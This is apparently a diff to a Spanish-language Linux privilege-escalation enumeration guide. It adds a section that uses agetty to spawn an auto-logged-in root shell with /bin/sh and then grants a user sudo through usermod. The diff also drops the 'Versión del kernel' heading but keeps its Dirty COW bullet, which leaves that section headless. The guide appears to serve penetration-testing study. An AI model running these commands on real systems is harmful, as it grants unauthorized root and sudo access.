@@ -36,6 +36,21 @@ python3 privesc_enum.py 2>/dev/null
 
 - Capacidades como `cap_setuid` asignadas a programas como Python o Vim pueden permitir obtener privilegios elevados.
 
-6\. Versión del kernel
+
+### Caso especifico con aggetty
+
+En terminal, ejecutar:
+
+`agetty -l /bin/sh -o -p -a root tty`
+
+despues en la nueva terminal root:
+
+`usermod -aG sudo user` siendo `user` el usuario al que se desea conceder sudo.
+
+`exit`
+
+una vez de vuelta en la terminal normal:
+
+`su - user`
 
 - Permite comprobar si el sistema es vulnerable a fallos de seguridad conocidos, como Dirty COW (`CVE-2016-5195`).
